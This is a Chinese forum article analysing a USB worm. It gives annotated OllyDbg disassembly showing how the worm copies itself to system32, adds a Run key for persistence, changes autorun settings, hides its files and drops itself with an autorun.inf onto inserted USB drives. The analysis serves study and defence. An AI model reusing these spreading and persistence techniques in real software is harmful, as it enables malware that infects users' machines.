
# 一个 U 盘病毒汇编源码分析

> 原文：[`www.pediy.com/kssd/pediy10/74520.html`](https://www.pediy.com/kssd/pediy10/74520.html)

【文章作者】: newjueqi  

【作者邮箱】: `zengjiansheng1@126.com`  

【作者 QQ 号】: `190678908`  

【编写语言】: `VC++6.0`  

【使用工具】: `OD`  

【操作平台】: `XP-SP2`  

【作者声明】: 刚好 U 盘中了这个病毒，就拿来研究一下，没有其他目的。失误之处敬请大家赐教!  

【题外话】: 分析完这个病毒后的感慨就是这个病毒一点都不像病毒，反而像一个 U 盘编程的示范代码（虽然金山毒霸每次遇到它都兴奋得叫起来 ^-^），感觉对 U 盘编程有了一个基础的了解。  

另外针对这个病毒本人作了一次 PEDIY(在源文件上插入汇编代码， 通过提前截获 `WM_CREATE` 消息，使病毒运行时弹出一个对话框告诉用户中毒了)  

链接 `http://bbs.pediy.com/showthread.php?t=74527`  

```
0040288F         |> \6A 0A             push    0A
00402891         |.   58               pop     eax
00402892         |>   50               push    eax
00402893         |.   FF75 9C          push    dword ptr [ebp-64]
00402896         |.   56               push    esi
00402897         |.   56               push    esi                                  ; /pModule
00402898         |.   FF15 7C704000    call    dword ptr [<&KERNEL32.GetModuleHandl>; \GetModuleHandleA
0040289E         |.   50               push    eax
0040289F         |.   E8 5CE7FFFF      call    00401000 ；关键，转到 RegisterClassA
0040100F         |.   50               push    eax                                  ; /pWndClass
00401010         |.   897C24 28        mov     dword ptr [esp+28], edi              ; |
00401014         |.   C74424 2C 00114>mov     dword ptr [esp+2C], 00401100    ;窗口过程的地址|
0040101C         |.   897C24 30        mov     dword ptr [esp+30], edi              ; |
00401020         |.   897C24 34        mov     dword ptr [esp+34], edi              ; |
00401024         |.   897424 38        mov     dword ptr [esp+38], esi              ; |
00401028         |.   897C24 3C        mov     dword ptr [esp+3C], edi              ; 
0040102C         |.   897C24 40        mov     dword ptr [esp+40], edi              ; |
00401030         |.   897C24 44        mov     dword ptr [esp+44], edi              ; |
00401034         |.   897C24 48        mov     dword ptr [esp+48], edi              ; |
00401038         |.   C74424 4C 4C804>mov     dword ptr [esp+4C], 0040804C         ; |ASCII "UUUUUU"
00401040         |.   FF15 18714000    call    dword ptr [<&USER32.RegisterClassA>] ; \RegisterClassA
00401137          > \68 748B4000           push    00408B74                     ;   ASCII "C:\WINDOWS\system32"; Case 1 (WM_CREATE) of switch 00401104   ；第一条分支
0040113C           .  C605 6D8A4000 3A        mov     byte ptr [408A6D], 3A
; 3A，也就是 ASCII 码 “:”
00401143           .  E8 E8000000             call    00401230 ; 调用 GetSystemDirectoryA 获取系统的目录，内容如下
00401230         /$   8B4424 04              mov     eax, dword ptr [esp+4]     ;   auto.00408B74
00401234         |.   68 04010000            push    104      ; /BufSize = 104 (260.)
00401239         |.   50                    push    eax      ; |Buffer
0040123A         |.   FF15 64704000         call    dword ptr [<&KERNEL32.GetS>; \GetSystemDirectoryA
00401240         \.   C3                    retn
00401148           .  8B4C24 08             mov     ecx, dword ptr [esp+8]
0040114C           .  83C4 04               add     esp, 4
0040114F           .  6A 00                  push    0        ; /Timerproc = NULL
00401151           .  68 88130000            push    1388     ; |Timeout = 5000. ms
00401156           .  6A 01                  push    1        ; |TimerID = 1
00401158           .  51                     push    ecx       ; |hWnd
00401159           .  FF15 10714000         call    dword ptr [<&USER32.SetTim>; \SetTimer  ；申请了一个时间周期为 5 秒的计时器
0040115F           .  68 708A4000           push    00408A70
00401164           .  E8 A7000000           call    00401210 ；调用 GetModuleFileNameA 获取病毒文件自身的路径，内容如下
00401210         /$   8B4424 04   mov     eax, dword ptr [esp+4]  ;   auto.00408A70
00401214         |.   68 04010000 push    104                   ; /BufSize = 104 (260.)
00401219         |.   50            push    eax                 ; |PathBuffer
0040121A         |.   6A 00         push    0                   ； |hModule = NULL
0040121C         |.   FF15 6C7040>call    dword ptr [<&KERNEL32.GetModule>; \GetModuleFileNameA ；把病毒的文件路径保存在 eax 里
00401222         |.   F7D8        neg     eax         
00401224         |.   1BC0        sbb     eax, eax
00401226         |.   F7D8        neg     eax
00401228         \.   C3          retn
```

从以上分析可知道病毒初始化时做了 3 件事情：

1.  获取系统目录的路径
2.  申请了一个时间周期为 5 秒的计时器
3.  获取了病毒自身的路径

下面继续分析：

```
00401171        > \8A15 708A40>mov     dl, byte ptr [408A70]      ;   Case 113 (WM_TIMER) of switch 00401104  ；dl 中存储的是病毒的路径
00401104  00401177        .  748B4000 mov     al, byte ptr [408B74]
; al 中存储的是系统目录的路径
0040117C        .  3AD0        cmp     dl, al ；比较当前文件的路径是否和系统的路径的相同，也就是检查当前文件是否在系统目录
0040117E        .  75 19       jnz     short 00401199 ；发现路径不相同就跳 00401199
；路径相同就检查有没有设备变化的信息
00401180        .  8B4424 04   mov     eax, dword ptr [esp+4]
00401184        .  6A 00       push    0                        ; /lParam = 0
00401186        .  6A 00       push    0                        ; |wParam = 0
00401188        .  68 19020000 push    219                      ; |Message = WM_DEVICECHANGE
0040118D        .  50         push    eax                      ; |hWnd
0040118E        .  FF15 147140>call    dword ptr [<&USER32.Send>; \SendMessageA
；发送检查设备的信息
00401194        .  33C0        xor     eax, eax ；清空 eax
00401196        .  C2 1000     retn    10
；发现病毒文件不是从系统目录启动就执行下面的操作
00401199        >   8B4C24 04   mov     ecx, dword ptr [esp+4]
0040119D        .  51         push    ecx
0040119E        .  E8 AD000000 call    00401250
00401250       /$   81EC 040100>sub     esp, 104
00401256       |.  8D4424 00   lea     eax, dword ptr [esp]
0040125A       |.  56          push    esi
0040125B       |.  68 748B4000 push    00408B74                  ; /String2 = "C:\WINDOWS\system32"
00401260       |.  50          push    eax                         ; |String1
00401261       |.  FF15 147040>call    dword ptr [<&KERNEL32.lstrc>; \lstrcpyA
；复制系统路径
00401267       |.  8B35 107040>mov     esi, dword ptr [<&KERNEL32.>;  kernel32.lstrcatA
0040126D       |.  8D4C24 04   lea     ecx, dword ptr [esp+4] ；把系统路径传到 ecx
00401271       |.  68 98804000 push    00408098                  ; /StringToAdd = "\\"
00401276       |.  51          push    ecx                         ; |ConcatString，"C:\WINDOWS\system32"
00401277       |.  FFD6        call    esi                         ; \lstrcatA
; 调用字符串连接函数使系统路径变为"C:\WINDOWS\system32\"
00401279       |.  8B15 448040>mov     edx, dword ptr [408044]     ;   auto.00408060
0040127F       |.  8D4424 04   lea     eax, dword ptr [esp+4]
00401283       |.  52          push    edx                         ; /StringToAdd => "uc.exe"
00401284       |.  50          push    eax                         ; |ConcatString，"C:\WINDOWS\system32\"
00401285       |.  FFD6        call    esi                         ; \lstrcatA
；路径变为"C:\WINDOWS\system32\ uc.exe "
00401287       |.  8D4C24 04   lea     ecx, dword ptr [esp+4]  
; ecx 中存放路径"C:\WINDOWS\system32\ uc.exe "
0040128B       |.  51          push    ecx
0040128C       |.  E8 6F000000 call    00401300
；检查系统目录中是否已存在要复制的文件
00401300       /$   8B4424 04   mov     eax, dword ptr [esp+4]
00401304       |.  50          push    eax                      ; /Path
00401305       |.  FF15 007140>call    dword ptr [<&SHLWAPI.P>; \PathFileExistsA
0040130B       |.  48          dec     eax
0040130C       |.  F7D8        neg     eax
0040130E       |.  1BC0        sbb     eax, eax
00401310       |.  40          inc     eax
00401311       \.  C3          retn
00401291       |.  83C4 04     add     esp, 4
```



`00401294`       `|.` `85C0`       `test` `eax, eax`；检查文件是否存在  

`00401296`       `|.` `5E`         `pop` `esi`  

`00401297`       `|.` `75 2F`      `jnz` `short 004012C8`；如果文件已经存在就跳  

`00401299`       `|.` `8D5424 00`  `lea` `edx, dword ptr [esp]`  

`0040129D`       `|.` `50`         `push` `eax`                    ; `/FailIfExists`

`0040129E`       `|.` `52`         `push` `edx`                    ; `|NewFileName`

`0040129F`       `|.` `68 708A4000` `push` `00408A70`             

`004012A4`       `|.` `FF15 347040>` `call` `dword ptr [<&KERNEL32.CopyF>; \CopyFileA`

；把文件复制到系统目录  

`004012AA`       `|.` `8D4424 00`  `lea` `eax, dword ptr [esp]`  

`004012AE`       `|.` `50`         `push` `eax`  

`004012AF`       `|.` `E8 7C000000` `call` `00401330`  

；修改注册表，使病毒文件开机自启动和 U 盘自动播放  

`00401330`       `/$` `83EC 08`    `sub` `esp, 8`  

`00401333`       `|.` `56`         `push` `esi`  

`00401334`       `|.` `8B35 087040>` `mov` `esi, dword ptr >; ADVAPI32.RegOpenKeyA`  

`0040133A`       `|.` `8D4424 04`  `lea` `eax, dword ptr >`  

`0040133E`       `|.` `57`         `push` `edi`  

`0040133F`       `|.` `50`         `push` `eax`         ; `/pHandle`

`00401340`       `|.` `68 E0804000` `push` `004080E0`      ; `|Subkey = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"`

`00401345`       `|.` `68 01000080` `push` `80000001`      ; `|hKey = HKEY_CURRENT_USER`

`0040134A`       `|.` `C74424 18 0>` `mov` `dword ptr [esp+>; |`

`00401352`       `|.` `FFD6`       `call` `esi`         ; `\RegOpenKeyA`

`00401354`       `|.` `8B5424 08`  `mov` `edx, dword ptr >`  

`00401358`       `|.` `8B3D 007040>` `mov` `edi, dword ptr >; ADVAPI32.RegSetValueExA`  

`0040135E`       `|.` `8D4C24 0C`  `lea` `ecx, dword ptr >`  

`00401362`       `|.` `6A 04`      `push` `4`         ; `/BufSize = 4`

`00401364`       `|.` `51`         `push` `ecx`       ; `|Buffer`

`00401365`       `|.` `6A 04`      `push` `4`         ; `|ValueType = REG_DWORD`

`00401367`       `|.` `6A 00`      `push` `0`         ; `|Reserved = 0`

`00401369`       `|.` `68 CC804000` `push` `004080CC`    ; `|ValueName = "NoDriveTypeAutoRun"`

`0040136E`       `|.` `52`         `push` `edx`       ; `|hKey`

`0040136F`       `|.` `FFD7`       `call` `edi`       ; `\RegSetValueExA`

`00401371`       `|.` `8D4424 08`  `lea` `eax, dword ptr >`  

`00401375`       `|.` `50`         `push` `eax`       ; `/pHandle`

`00401376`       `|.` `68 9C804000` `push` `0040809C`    ; `|Subkey = "SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run"`

`0040137B`       `|.` `68 02000080` `push` `80000002`    ; `|hKey = HKEY_LOCAL_MACHINE`

`00401380`       `|.` `FFD6`       `call` `esi`       ; `\RegOpenKeyA`

`00401382`       `|.` `85C0`       `test` `eax, eax`  

`00401384`       `|.` `75 35`      `jnz` `short 004013BB`  

`00401386`       `|.` `8B7424 14`  `mov` `esi, dword ptr >`  

`0040138A`       `|.` `56`         `push` `esi`       ; `/String`

`0040138B`       `|.` `FF15 1C7040>` `call` `dword ptr [<&KE>; \lstrlenA`  

`00401391`       `|.` `8B0D 448040>` `mov` `ecx, dword ptr >; auto.00408060`  

`00401397`       `|.` `8B5424 08`  `mov` `edx, dword ptr >`  

`0040139B`       `|.` `50`         `push` `eax`       ; `/BufSize`

`0040139C`       `|.` `56`         `push` `esi`       ; `|Buffer`

`0040139D`       `|.` `6A 01`      `push` `1`         ; `|ValueType = REG_SZ`

`0040139F`       `|.` `6A 00`      `push` `0`         ; `|Reserved = 0`

`004013A1`       `|.` `51`         `push` `ecx`       ; `|ValueName => "uc.exe"`

`004013A2`       `|.` `52`         `push` `edx`       ; `|hKey`

`004013A3`       `|.` `FFD7`       `call` `edi`       ; `\RegSetValueExA`

`004013A5`       `|.` `8B4424 08`  `mov` `eax, dword ptr >`  

`004013A9`       `|.` `50`         `push` `eax`       ; `/hKey`

`004013AA`       `|.` `FF15 047040>` `call` `dword ptr [<&AD>; \RegCloseKey`  

`004013B0`       `|.` `5F`         `pop` `edi`  

`004013B1`       `|.` `B8 01000000` `mov` `eax, 1`  

`004013B6`       `|.` `5E`         `pop` `esi`  

`004013B7`       `|.` `83C4 08`    `add` `esp, 8`  

`004013BA`       `|.` `C3`         `retn`  

`004013BB`       `|>` `5F`         `pop` `edi`  

`004013BC`       `|.` `33C0`       `xor` `eax, eax`  

`004013BE`       `|.` `5E`         `pop` `esi`  

`004013BF`       `|.` `83C4 08`    `add` `esp, 8`  

`004013C2`       `\.` `C3`         `retn`  

`004012B4`       `|.` `8D4C24 04`  `lea` `ecx, dword ptr [esp+4]`  

`004012B8`       `|.` `51`         `push` `ecx`  

`004012B9`       `|.` `E8 62000000` `call` `00401320`  

;设置病毒文件的属性为系统，隐藏  

`00401320`       `/$` `8B4424 04`  `mov` `eax, dword ptr >`  

`00401324`       `|.` `6A 06`      `push` `6`         ; `/FileAttributes = HIDDEN|SYSTEM`

`00401326`       `|.` `50`         `push` `eax`       ; `|FileName`

`00401327`       `|.` `FF15 187040>` `call` `dword ptr [<&KE>; \SetFileAttributesA`  

`0040132D`       `\.` `C3`         `retn`  

；如果病毒文件已经在系统目录下，执行下面的操作，这里从 `00401297` 跳过来  

`004012C8`       `|>` `E8 D3030000` `call` `004016A0`  

;通过枚举进程列表查看自身是否已经运行  

`004016A0`       `/$` `81EC 280100>` `sub` `esp, 128`  

`004016A6`       `|.` `56`         `push` `esi`  

`004016A7`       `|.` `57`         `push` `edi`  

`004016A8`       `|.` `6A 00`      `push` `0`         ; `/ProcessID = 0`

`004016AA`       `|.` `6A 02`      `push` `2`         ; `|Flags = TH32CS_SNAPPROCESS`  

`004016AC`       `|.` `E8 BB000000` `call` `<jmp.&KERNEL32.>; \CreateToolhelp32Snapshot`  

`004016B1`       `|.` `8BF0`       `mov` `esi, eax`  

`004016B3`       `|.` `8D4424 08`  `lea` `eax, dword ptr >`  

`004016B7`       `|.` `50`         `push` `eax`       ; `/lppe`

`004016B8`       `|.` `56`         `push` `esi`       ; `|hSnapshot`

`004016B9`       `|.` `C74424 10 2>` `mov` `dword ptr [esp+>; |`

`004016C1`       `|.` `E8 A0000000` `call` `<jmp.&KERNEL32.>; \Process32First`  

`004016C6`       `|.` `85C0`       `test` `eax, eax`  

`004016C8`       `|.` `74 4E`      `je` `short 00401718`  

`004016CA`       `|.` `8B0D 448040>` `mov` `ecx, dword ptr >; auto.00408060`  

`004016D0`       `|.` `8B3D 287040>` `mov` `edi, dword ptr >; kernel32.lstrcmpA`  

`004016D6`       `|.` `8D5424 2C`  `lea` `edx, dword ptr >`  

`004016DA`       `|.` `51`         `push` `ecx`       ; `/String2 => "uc.exe"`

`004016DB`       `|.` `52`         `push` `edx`       ; `|String1`

`004016DC`       `|.` `FFD7`       `call` `edi`       ; `\lstrcmpA`

`004016DE`       `|.` `85C0`       `test` `eax, eax`  

`004016E0`       `|.` `74 21`      `je` `short 00401703`  

`004016E2`       `|>` `8D4424 08`  `/lea` `eax, dword ptr>`

`004016E6`       `|.` `50`         `|push` `eax`        ; `/lppe`

`004016E7`       `|.` `56`         `|push` `esi`        ; `|hSnapshot`

`004016E8`       `|.` `E8 73000000` `|call` `<jmp.&KERNEL32>; \Process32Next`  

`004016ED`       `|.` `85C0`       `|test` `eax, eax`  

`004016EF`       `|.` `74 27`      `|je` `short 00401718`  

`004016F1`       `|.` `8B0D 448040>` `|mov` `ecx, dword ptr >; auto.00408060`  

`004016F7`       `|.` `8D5424 2C`  `|lea` `edx, dword ptr>`

`004016FB`       `|.` `51`         `|push` `ecx`  

`004016FC`       `|.` `52`         `|push` `edx`  

`004016FD`       `|.` `FFD7`       `|call` `edi`  

`004016FF`       `|.` `85C0`       `|test` `eax, eax`  

`00401701`       `|.^` `75 DF`     `\jnz` `short 004016E2`  

`00401703`       `|>` `56`         `push` `esi`       ; `/hObject`

`00401704`       `|.` `FF15 207040>` `call` `dword ptr [<&KE>; \CloseHandle`  

`0040170A`       `|.` `5F`         `pop` `edi`  

`0040170B`       `|.` `B8 01000000` `mov` `eax, 1`；返回值为 1  

`00401710`       `|.` `5E`         `pop` `esi`  

`00401711`       `|.` `81C4 280100>` `add` `esp, 128`  

`00401717`       `|.` `C3`         `retn`  

`00401718`       `|>` `56`         `push` `esi`       ; `/hObject`

`00401719`       `|.` `FF15 207040>` `call` `dword ptr [<&KE>; \CloseHandle`  

`0040171F`       `|.` `5F`         `pop` `edi`  

`00401720`       `|.` `33C0`       `xor` `eax, eax`；返回值为 0  

`00401722`       `|.` `5E`         `pop` `esi`  

`00401723`       `|.` `81C4 280100>` `add` `esp, 128`  

`00401729`       `\.` `C3`         `retn`  

；判断自身有没有运行  

`004012CD`       `|.` `85C0`       `test` `eax, eax`；通过在 `eax` 的返回值判断



004012CF       |.  75 20       jnz     short 004012F1  

004012D1       |.  8D5424 00   lea     edx, dword ptr [esp]  

004012D5       |.  50          push    eax                 ; /ShowState  

004012D6       |.  52          push    edx                 ; |CmdLine  

004012D7       |.  FF15 607040>call    dword ptr [<&KERNEL32.WinEx>; \WinExec  

；以隐藏的方式执行  

004012DD       |.  8B8424 0801>mov     eax, dword ptr [esp+108]  

004012E4       |.  6A 00       push    0                   ; /lParam = 0  

004012E6       |.  6A 00       push    0                   ; |wParam = 0  

004012E8       |.  6A 10       push    10                  ; |Message = WM_CLOSE  

004012EA       |.  50          push    eax                 ; |hWnd  

004012EB       |.  FF15 147140>call    dword ptr [<&USER32.SendMes>; \SendMessageA  

004012F1       |>  33C0        xor     eax, eax  

004012F3       |.  81C4 040100>add     esp, 104  

004012F9       \.  C3          retn  

；有输入设备信息  

004011CB   > \8B4424 10     mov     eax, dword ptr [esp+10]       ;  Case 219 (WM_DEVICECHANGE) of switch 00401104；  

；查了一下 MSDN，响应 WM_DEVICECHANGE 这个消息的函数声明如下  

；LRESULT CALLBACK WindowProc(  

；  HWND hwnd,       // handle to window  

；  UINT uMsg,       // WM_DEVICECHANGE  

；WPARAM wParam,    // device-change event  

；  LPARAM lParam    // event-specific data  

；);  

004011CF   .  8B4C24 0C     mov     ecx, dword ptr [esp+C]  

004011D3   .  8B5424 04     mov     edx, dword ptr [esp+4]  

004011D7   .  50           push    eax  ；lParam  

004011D8   .  51           push    ecx  ; wParam  

004011D9   .  52           push    edx  ； hwnd  

；因为 uMsg 是默认为 WM_DEVICECHANGE，所以只有三个参数  

004011DA   .  E8 F1FEFFFF   call    004010D0  

`WM_DEVICECHANGE` 的说明如下：  

当 Windows 系统的硬件设置发生变化时,系统将会向所有应用程序发送一条 `WM_DEVICECHANGE` 消息.当有设备被禁止或激活时(比如我们插入光盘,从光驱中取出光盘,或者在系统设备中删除或禁止打印端口),该消息的 `wParam` 参数分别被指定为 `DBT_DEVICEARRIVAL`(设备安装完毕)和 `DBT_DEVICEREMOVECOMPLETE`(设备移除完毕),根据这两个参数可以判断闪存是否存在,`lParam` 参数指向一 `DEV_BROADCAST_HDR` 结构,该结构中的 `dbch_deviacetype` 成员是变化设备的类型,当该值为 `DBT_DEVTYP_VOLUME` 时,表明一个带有卷标名的驱动器发生了变化  

（出处：http://sogoodm.com/soft/t5/16303-63858.html ）  

004010D0  /$  817C24 08 008>  cmp     dword ptr [esp+8], 8000 ；比较是否插入了新的设备，8000 是宏 `DBT_DEVICEARRIVAL` 的值，表示系统插入了一个新设备，相关的定义在 Include\DBT.h 头文件里（我的是 VC6），顺便说一句，查这个 8000 表示什么就查了半天，非常郁闷！！！  

004010D8  |.  75 20         jnz     short 004010FA ；如果不是插入新设备就跳  

004010DA  |.  8B4424 0C     mov     eax, dword ptr [esp+C]  

004010DE  |.  8378 04 02    cmp     dword ptr [eax+4], 2 ；  

004010E2  |.  75 16         jnz     short 004010FA  

004010E4  |.  8B40 0C       mov     eax, dword ptr [eax+C]  

004010E7  |.  50           push    eax  

004010E8  |.  E8 03010000   call    004011F0 ；获取 U 盘的盘符  

；枚举 26 个驱动器，通过查看哪个发生了变化来获取 U 盘的盘符  

004011F0  /$  8B4C24 04     mov     ecx, dword ptr [esp+4]  

004011F4  |.  32C0          xor     al, al ；从 0 开始比较  

004011F6  |>  F6C1 01       /test    cl, 1  

004011F9  |.  75 08         |jnz     short 00401203  

004011FB  |.  D1E9          |shr     ecx, 1  

004011FD  |.  FEC0          |inc     al  

004011FF  |.  3C 1A         |cmp     al, 1A ；比较是否已达到了 26  

00401201  |.^ 7C F3         \jl      short 004011F6  

00401203  |>  83C0 41       add     eax, 41 ；用盘符的索引加上‘A’得到盘符的字母注意 41 是 16 进制，转化为 10 进制就是 ASC 码‘A’  

00401206  \.  C3           retn  

004010ED  |.  83C4 04       add     esp, 4  

004010F0  |.  A2 5C8A4000   mov     byte ptr [408A5C], al  

004010F5  |.  E8 D6020000   call    004013D0 ；  

；把自身复制到 U 盘并且在 U 盘下创建一个 autorun.inf 文件  

004013D0  /$  81EC 08020000 sub     esp, 208  

004013D6  |.  8D8424 040100>lea     eax, dword ptr [esp+104]  

004013DD  |.  56           push    esi  

004013DE  |.  57           push    edi  

004013DF  |.  8B3D 14704000 mov     edi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcpyA  

004013E5  |.  68 5C8A4000   push    00408A5C                 ; /String2 = "B"  

004013EA  |.  50           push    eax                    ; |String1  

004013EB  |.  FFD7         call    edi                    ; \lstrcpyA  

004013ED  |.  8B35 10704000 mov     esi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcatA  

004013F3  |.  8D8C24 0C0100>lea     ecx, dword ptr [esp+10C]  

004013FA  |.  68 90804000   push    00408090                 ; /StringToAdd = "\"  

004013FF  |.  51           push    ecx                    ; |ConcatString  

00401400  |.  FFD6         call    esi                    ; \lstrcatA  

00401402  |.  8B15 40804000 mov     edx, dword ptr [408040]      ;  auto.00408068  

00401408  |.  8D8424 0C0100>lea     eax, dword ptr [esp+10C]  

0040140F  |.  52           push    edx                    ; /StringToAdd => "uc1.exe"  

00401410  |.  50           push    eax                    ; |ConcatString  

00401411  |.  FFD6         call    esi                    ; \lstrcatA  

00401413  |.  8D4C24 08     lea     ecx, dword ptr [esp+8]  

00401417  |.  68 5C8A4000   push    00408A5C                 ; /String2 = "B"  

0040141C  |.  51           push    ecx                    ; |String1  

0040141D  |.  FFD7         call    edi                    ; \lstrcpyA  

0040141F  |.  8D5424 08     lea     edx, dword ptr [esp+8]  

00401423  |.  68 90804000   push    00408090                 ; /StringToAdd = "\"  

00401428  |.  52           push    edx                    ; |ConcatString  

00401429  |.  FFD6         call    esi                    ; \lstrcatA  

0040142B  |.  A1 48804000   mov     eax, dword ptr [408048]  

00401430  |.  8D4C24 08     lea     ecx, dword ptr [esp+8]  

00401434  |.  50           push    eax                    ; /StringToAdd => "AutoRun.inf"  

00401435  |.  51           push    ecx                    ; |ConcatString  

00401436  |.  FFD6         call    esi                    ; \lstrcatA  

00401438  |.  8D5424 08     lea     edx, dword ptr [esp+8]  

0040143C  |.  52           push    edx  

0040143D  |.  E8 BEFEFFFF   call    00401300     ；检测文件是否存在  

00401442  |.  83C4 04       add     esp, 4  

00401445  |.  85C0         test    eax, eax  

00401447  |.  5F           pop     edi  

00401448  |.  5E           pop     esi  

00401449  |.  75 17         jnz     short 00401462  

0040144B  |.  8D4424 00     lea     eax, dword ptr [esp]  

0040144F  |.  50           push    eax  

00401450  |.  E8 5B000000   call    004014B0 ；在 U 盘创建一个 autorun.inf 文件  

00401455  |.  8D4C24 04     lea     ecx, dword ptr [esp+4]  

00401459  |.  51           push    ecx  

0040145A  |.  E8 C1FEFFFF   call    00401320 ；设置文件的属性  

0040145F  |.  83C4 08       add     esp, 8  

00401462  |>  8D9424 040100>lea     edx, dword ptr [esp+104]  

00401469  |.  52           push    edx  

0040146A  |.  E8 91FEFFFF   call    00401300 ；检查文件是否存在  

0040146F  |.  83C4 04       add     esp, 4  

00401472  |.  85C0         test    eax, eax  

00401474  |.  75 2B         jnz     short 004014A1  

00401476  |.  50           push    eax                 ; /FailIfExists  

00401477  |.  8D8424 080100>lea     eax, dword ptr [esp+108]        ; |  

0040147E  |.  50           push    eax                 ; |NewFileName  

0040147F  |.  68 608A4000   push    00408A60                 ; |ExistingFileName = ""  

00401484  |.  FF15 34704000 call    dword ptr [<&KERNEL32.CopyFileA>>; \CopyFileA  

0040148A  |.  8D8C24 040100>lea     ecx, dword ptr [esp+104]  

00401491  |.  51           push    ecx ；U 盘文件的路径  

00401492  |.  E8 89FEFFFF   call    00401320 ；设置文件的属性  

00401497  |.  83C4 04       add     esp, 4  

0040149A  |.  81C4 08020000 add     esp, 208  

004014A0  |.  C3           retn  

004014A1  |>  33C0         xor     eax, eax  



004014A3  .  81C4 08020000  add     esp, 208  

004014A9  .  C3             retn  

最后，进程关闭时的代码如下：

0040111D   .  8B4424 04      mov     eax, dword ptr [esp+4]          ;  Case 2 (WM_DESTROY) of switch 00401104  

00401121   .  6A 01          push    1                               ; /TimerID = 1  

00401123   .  50            push    eax                             ; |hWnd  

00401124   .  FF15 08714000 call    dword ptr [<&USER32.KillTimer>] ; \KillTimer  

0040112A   .  6A 00          push    0                               ; /ExitCode = 0  

0040112C   .  FF15 0C714000 call    dword ptr [<&USER32.PostQuitMessage>]; \PostQuitMessage  

00401132   .  33C0          xor     eax, eax  

00401134   .  C2 1000       retn    10  

### 1. 病毒描述：  

该病毒是一种 U 盘病毒，病毒运行后释放病毒文件到系统目录下，命名为 `uc.exe` 并执行。在用户毫无察觉的情况下；修改注册表键值，病毒开机自动运行，开启自动播放；监测系统中有没有插入 U 盘，如果检测到插入 U 盘就向 U 盘中释放病毒文件并且创建一个 `autorun.inf` 文件

### 2. 病毒行为分析  

#### （1）病毒运行后释放病毒文件：  

`C:\WINDOWS\system32\uc.exe`  

#### （2）修改注册表  

在 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` 中创建 `NoDriveTypeAutoRun`

在 `HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run` 中添加病毒文件的路径  

#### （3）向 U 盘中释放病毒文件和创建 `autorun.inf` 文件
